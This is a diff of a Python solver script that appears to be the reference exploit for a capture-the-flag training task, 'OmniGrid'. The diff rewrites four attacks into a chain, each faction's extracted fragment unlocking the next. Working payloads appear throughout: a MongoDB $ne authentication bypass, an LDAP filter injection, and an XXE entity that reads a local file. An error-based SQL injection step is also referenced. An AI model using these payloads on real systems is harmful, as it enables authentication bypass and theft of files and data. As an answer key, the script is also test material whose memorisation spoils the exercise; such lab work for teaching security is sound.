@@ -2,18 +2,18 @@
 """solvers/f2.py, Task F.2 "Chairman Election Infiltration" (OmniGrid)
 canonical exploit.
 
-Four independent faction systems, four independent injection classes,
-each one already taught earlier in this arc, now applied against a
-brand-new target with no other hints:
+Four faction systems, four injection classes each taught earlier in this
+arc, chained so that each faction opens the next: only Onboarding stands
+open, and every faction stays sealed until the previous faction's fragment
+is presented as its `token`.
 
   Onboarding faction:  MariaDB, error-based SQLi        (Phase 1 technique)
   Mobile API faction:  MongoDB, $ne operator auth bypass (Phase 4 technique)
   Directory faction:   OpenLDAP, filter-injection dump   (Phase 4 technique)
   Document Import:     XXE external-entity file read     (Phase 5 technique)
 
-None of the four faction routes accepts a fragment as input, and none of
-them know about each other or about the final flag. This script extracts
-all four fragments live, then POSTs them together to
+This script breaches the chain in order, carrying each extracted fragment
+forward as the next faction's token, then POSTs all four together to
 `/f/omnigrid/seize`, which independently re-derives each faction's real
 current fragment via a safe, non-injectable lookup of its own and grants
 the flag only if all four submitted values genuinely match.
@@ -49,49 +49,53 @@ def onboarding_fragment() -> str:
     return tail.split("&#39;", 1)[0].lstrip(":")
 
 
-def mobile_fragment() -> str:
-    """$ne operator auth bypass, identical technique to p4_2."""
+def mobile_fragment(token: str) -> str:
+    """$ne operator auth bypass, identical technique to p4_2. Chained: this
+    faction stays sealed until the Onboarding fragment is presented as
+    `token`."""
     resp = requests.post(
         f"{BASE}/f/omnigrid/mobile",
         headers={"Accept": "application/json"},
-        data={"username[$ne]": "1", "password[$ne]": "1"},
+        data={"token": token, "username[$ne]": "1", "password[$ne]": "1"},
         timeout=10,
     )
     resp.raise_for_status()
     m = re.search(r"CHAIR-[A-Za-z0-9-]+", resp.text)
     if not m:
-        raise RuntimeError("mobile: $ne bypass did not reveal a fragment")
+        raise RuntimeError("mobile: sealed (wrong token?) or $ne bypass failed")
     return m.group(0)
 
 
-def directory_fragment() -> str:
-    """LDAP filter-injection enumeration, identical technique to p4_3."""
+def directory_fragment(token: str) -> str:
+    """LDAP filter-injection enumeration, identical technique to p4_3.
+    Chained: sealed until the Mobile API fragment is presented as `token`."""
     resp = requests.get(
         f"{BASE}/f/omnigrid/directory",
-        params={"uid": "*)(objectClass=*"},
+        params={"token": token, "uid": "*)(objectClass=*"},
         timeout=10,
     )
     resp.raise_for_status()
     m = re.search(r"CHAIR-[A-Za-z0-9-]+", resp.text)
     if not m:
-        raise RuntimeError("directory: enumeration did not reveal a fragment")
+        raise RuntimeError("directory: sealed (wrong token?) or enumeration failed")
     return m.group(0)
 
 
-def document_fragment() -> str:
-    """XXE external-entity file read, identical technique to p5_4."""
+def document_fragment(token: str) -> str:
+    """XXE external-entity file read, identical technique to p5_4. Chained:
+    sealed until the Directory fragment is presented as `token`."""
     xml = (
         '<?xml version="1.0"?>'
         '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///opt/omnigrid/fragment.txt">]>'
         "<request><document>&xxe;</document></request>"
     )
     resp = requests.post(
-        f"{BASE}/f/omnigrid/import", data={"xml": xml}, timeout=10
+        f"{BASE}/f/omnigrid/import", data={"token": token, "xml": xml}, timeout=10
     )
     resp.raise_for_status()
     m = re.search(r"CHAIR-[A-Za-z0-9-]+", resp.text)
     if not m:
-        raise RuntimeError("document: XXE did not reveal a fragment")
+        raise RuntimeError("document: sealed (wrong token?) or XXE failed")
     return m.group(0)
 
 
@@ -109,20 +113,22 @@ def seize(fragments: dict) -> dict:
 def main() -> int:
     print(f"[f2] target: {BASE}/f/omnigrid")
 
+    # Chained: each faction stays sealed until the previous faction's
+    # fragment is presented as its `token`, so OmniGrid falls in order.
     print("[f2] faction 1, Onboarding (MariaDB, error-based SQLi)")
     onboarding = onboarding_fragment()
     print(f"  ok: fragment = {onboarding!r}")
 
-    print("[f2] faction 2, Mobile API (MongoDB, $ne auth bypass)")
-    mobile = mobile_fragment()
+    print("[f2] faction 2, Mobile API ($ne auth bypass) — opened by faction 1's fragment")
+    mobile = mobile_fragment(onboarding)
     print(f"  ok: fragment = {mobile!r}")
 
-    print("[f2] faction 3, Directory (OpenLDAP, filter-injection dump)")
-    directory = directory_fragment()
+    print("[f2] faction 3, Directory (LDAP filter injection) — opened by faction 2's fragment")
+    directory = directory_fragment(mobile)
     print(f"  ok: fragment = {directory!r}")
 
-    print("[f2] faction 4, Document Import (XXE file read)")
-    document = document_fragment()
+    print("[f2] faction 4, Document Import (XXE file read) — opened by faction 3's fragment")
+    document = document_fragment(directory)
     print(f"  ok: fragment = {document!r}")
 
     print("[f2] seizing the Chairman seat with all four fragments")
